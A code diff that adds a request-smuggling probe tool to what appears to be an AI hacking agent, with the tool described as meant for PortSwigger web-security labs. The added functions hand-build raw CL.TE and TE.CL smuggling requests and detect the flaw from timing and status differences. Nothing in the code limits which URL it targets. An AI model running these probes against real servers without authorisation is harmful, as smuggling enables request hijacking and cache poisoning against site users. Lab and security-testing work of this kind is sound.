@@ -25,8 +25,11 @@ import json
 import os
 import re
 import shlex
+import socket
+import ssl
 import time
 from typing import Any
+from urllib.parse import urlparse
 
 from hacking_agent.core import differ as differ_mod
 from hacking_agent.core import oob
@@ -82,6 +85,43 @@ TOOL_SCHEMAS = [
                     },
                 },
                 "required": ["command"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "request_smuggling_probe",
+            "description": (
+                "Send raw HTTP/1.1 request-smuggling probes over one TCP/TLS "
+                "connection without curl/browser normalization. Use this for "
+                "PortSwigger HTTP request smuggling labs and CL.TE/TE.CL "
+                "differential response checks. It can run the CL.TE 404 proof "
+                "where a smuggled back-end request makes a subsequent GET / "
+                "receive a 404 response."
+            ),
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "url": {
+                        "type": "string",
+                        "description": "Target base URL, for example https://LAB.web-security-academy.net/.",
+                    },
+                    "vector": {
+                        "type": "string",
+                        "enum": ["auto", "cl_te_404", "cl_te_timeout", "te_cl_prefix"],
+                        "description": "Probe vector. Use auto unless the lab title names CL.TE or TE.CL.",
+                    },
+                    "smuggled_path": {
+                        "type": "string",
+                        "description": "Path to smuggle for the CL.TE differential 404 proof. Default /404.",
+                    },
+                    "timeout": {
+                        "type": "integer",
+                        "description": "Read timeout per raw exchange in seconds. Default 6.",
+                    },
+                },
+                "required": ["url"],
             },
         },
     },
@@ -1053,6 +1093,265 @@ def run_shell(command: str, timeout: int = DEFAULT_TIMEOUT) -> str:
     return json.dumps(result, indent=2)
 
 
+def _probe_target_from_url(url: str) -> tuple[str, int, bool, str]:
+    parsed = urlparse(url if "://" in url else f"https://{url}")
+    host = parsed.hostname or ""
+    if not host:
+        raise ValueError(f"Could not parse host from URL: {url!r}")
+    https = parsed.scheme != "http"
+    port = parsed.port or (443 if https else 80)
+    path = parsed.path or "/"
+    if parsed.query:
+        path += f"?{parsed.query}"
+    return host, port, https, path
+
+
+def _http1_request(host: str, method: str = "GET", path: str = "/",
+                   close: bool = True) -> bytes:
+    connection = "close" if close else "keep-alive"
+    return (
+        f"{method} {path} HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        f"User-Agent: Reynard-smuggling-probe\r\n"
+        f"Accept: */*\r\n"
+        f"Connection: {connection}\r\n"
+        "\r\n"
+    ).encode("ascii")
+
+
+def _recv_http1_bytes(sock: socket.socket, timeout: float) -> tuple[bytes, bool, float]:
+    """Read until close or timeout. Returns (data, timed_out, elapsed)."""
+    started = time.monotonic()
+    deadline = started + max(timeout, 0.5)
+    chunks: list[bytes] = []
+    timed_out = False
+    sock.settimeout(0.35)
+
+    while time.monotonic() < deadline:
+        try:
+            chunk = sock.recv(8192)
+        except (socket.timeout, TimeoutError):
+            timed_out = True
+            continue
+        except ssl.SSLError as exc:
+            if "timed out" in str(exc).lower():
+                timed_out = True
+                continue
+            break
+        if not chunk:
+            timed_out = False
+            break
+        chunks.append(chunk)
+
+    return b"".join(chunks), timed_out, time.monotonic() - started
+
+
+def _status_codes(text: str) -> list[int]:
+    return [
+        int(match.group(1))
+        for match in re.finditer(r"HTTP/\d(?:\.\d)?\s+(\d{3})", text)
+    ]
+
+
+def _raw_http1_exchange(host: str, port: int, https: bool,
+                        sends: list[tuple[bytes, float]],
+                        timeout: float) -> dict[str, Any]:
+    started = time.monotonic()
+    try:
+        raw_sock = socket.create_connection((host, port), timeout=max(timeout, 1.0))
+        if https:
+            ctx = ssl.create_default_context()
+            ctx.set_alpn_protocols(["http/1.1"])
+            conn = ctx.wrap_socket(raw_sock, server_hostname=host)
+        else:
+            conn = raw_sock
+
+        try:
+            for data, delay_after in sends:
+                conn.sendall(data)
+                if delay_after > 0:
+                    time.sleep(delay_after)
+            raw, read_timed_out, read_elapsed = _recv_http1_bytes(conn, timeout)
+        finally:
+            try:
+                conn.close()
+            except Exception:
+                pass
+    except Exception as exc:
+        return {
+            "ok": False,
+            "error": str(exc),
+            "elapsed_seconds": round(time.monotonic() - started, 3),
+            "response_count": 0,
+            "statuses": [],
+            "timed_out": True,
+            "raw_excerpt": "",
+        }
+
+    text = raw.decode("latin-1", errors="replace")
+    statuses = _status_codes(text)
+    return {
+        "ok": True,
+        "elapsed_seconds": round(read_elapsed, 3),
+        "response_count": len(statuses),
+        "statuses": statuses,
+        "timed_out": read_timed_out,
+        "raw_excerpt": text[:1600],
+    }
+
+
+def _cl_te_404_request(host: str, smuggled_path: str) -> bytes:
+    smuggled_path = smuggled_path if smuggled_path.startswith("/") else f"/{smuggled_path}"
+    smuggled = (
+        f"GET {smuggled_path} HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        "X-Ignore: X"
+    ).encode("ascii")
+    body = b"0\r\n\r\n" + smuggled
+    headers = (
+        "POST / HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        "Content-Type: application/x-www-form-urlencoded\r\n"
+        f"Content-Length: {len(body)}\r\n"
+        "Transfer-Encoding: chunked\r\n"
+        "Connection: keep-alive\r\n"
+        "\r\n"
+    ).encode("ascii")
+    return headers + body
+
+
+def _cl_te_timeout_request(host: str) -> bytes:
+    body = b"1\r\nA"
+    headers = (
+        "POST / HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        f"Content-Length: {len(body)}\r\n"
+        "Transfer-Encoding: chunked\r\n"
+        "Connection: keep-alive\r\n"
+        "\r\n"
+    ).encode("ascii")
+    return headers + body
+
+
+def _te_cl_prefix_request(host: str) -> bytes:
+    body = b"0\r\n\r\nX"
+    headers = (
+        "POST / HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        "Content-Type: application/x-www-form-urlencoded\r\n"
+        f"Content-Length: {len(body)}\r\n"
+        "Transfer-Encoding: chunked\r\n"
+        "Connection: keep-alive\r\n"
+        "\r\n"
+    ).encode("ascii")
+    return headers + body
+
+
+def request_smuggling_probe(url: str, vector: str = "auto",
+                            smuggled_path: str = "/404",
+                            timeout: int = 6) -> str:
+    """Run raw HTTP/1.1 request-smuggling probes without client normalization."""
+    host, port, https, baseline_path = _probe_target_from_url(url)
+    read_timeout = float(max(2, min(timeout or 6, 20)))
+    second_get = _http1_request(host, "GET", "/", close=True)
+
+    baseline = _raw_http1_exchange(
+        host, port, https,
+        [
+            (_http1_request(host, "GET", baseline_path, close=False), 0.15),
+            (second_get, 0.0),
+        ],
+        read_timeout,
+    )
+
+    requested = [vector] if vector != "auto" else [
+        "cl_te_404", "cl_te_timeout", "te_cl_prefix"
+    ]
+    probes: dict[str, dict[str, Any]] = {}
+    if "cl_te_404" in requested:
+        probes["cl_te_404"] = _raw_http1_exchange(
+            host, port, https,
+            [(_cl_te_404_request(host, smuggled_path), 0.25), (second_get, 0.0)],
+            read_timeout,
+        )
+    if "cl_te_timeout" in requested:
+        probes["cl_te_timeout"] = _raw_http1_exchange(
+            host, port, https,
+            [(_cl_te_timeout_request(host), 0.25), (second_get, 0.0)],
+            read_timeout,
+        )
+    if "te_cl_prefix" in requested:
+        probes["te_cl_prefix"] = _raw_http1_exchange(
+            host, port, https,
+            [(_te_cl_prefix_request(host), 0.25), (second_get, 0.0)],
+            read_timeout,
+        )
+
+    baseline_statuses = baseline.get("statuses", [])
+    baseline_has_404 = 404 in baseline_statuses
+    clte_404 = probes.get("cl_te_404", {})
+    clte_timeout = probes.get("cl_te_timeout", {})
+    tecl_prefix = probes.get("te_cl_prefix", {})
+
+    clte_404_signal = bool(
+        clte_404.get("ok")
+        and not baseline_has_404
+        and 404 in clte_404.get("statuses", [])
+    )
+    clte_timeout_signal = bool(
+        clte_timeout.get("ok")
+        and not baseline.get("timed_out")
+        and clte_timeout.get("timed_out")
+        and clte_timeout.get("response_count", 0) < max(2, baseline.get("response_count", 0))
+    )
+    tecl_signal = bool(
+        tecl_prefix.get("ok")
+        and not baseline_has_404
+        and any(status >= 400 for status in tecl_prefix.get("statuses", []))
+    )
+
+    likely = None
+    if clte_404_signal or clte_timeout_signal:
+        likely = "cl_te"
+    elif tecl_signal:
+        likely = "te_cl"
+
+    evidence: list[str] = []
+    if clte_404_signal:
+        evidence.append(
+            "CL.TE differential response: baseline did not include 404, "
+            "but smuggled GET returned/queued 404 for the subsequent request."
+        )
+    if clte_timeout_signal:
+        evidence.append(
+            "CL.TE timeout signal: control exchange completed but crafted "
+            "chunked/CL request delayed the following request."
+        )
+    if tecl_signal:
+        evidence.append(
+            "TE.CL prefix signal: crafted chunk terminator/prefix changed the "
+            "following request into an error response."
+        )
+    if not evidence:
+        evidence.append("No reliable request-smuggling signal observed.")
+
+    return json.dumps({
+        "ok": True,
+        "url": url,
+        "host": host,
+        "port": port,
+        "https": https,
+        "forced_http_version": "HTTP/1.1",
+        "vector": vector,
+        "smuggled_path": smuggled_path,
+        "baseline": baseline,
+        "probes": probes,
+        "likely_vulnerability": likely,
+        "success": bool(likely),
+        "evidence_summary": " ".join(evidence),
+    }, indent=2)
+
+
 def tool_inventory(role: str = "general", check_container: bool = False) -> str:
     """Return the curated tool catalog and optional in-container availability."""
     role = (role or "general").lower()
@@ -1720,6 +2019,12 @@ TOOL_FUNCTIONS: dict[str, callable] = {
     "run_shell": lambda args: run_shell(
         command=args["command"],
         timeout=args.get("timeout", DEFAULT_TIMEOUT),
+    ),
+    "request_smuggling_probe": lambda args: request_smuggling_probe(
+        url=args["url"],
+        vector=args.get("vector", "auto"),
+        smuggled_path=args.get("smuggled_path", "/404"),
+        timeout=args.get("timeout", 6),
     ),
     "tool_inventory": lambda args: tool_inventory(
         role=args.get("role", "general"),
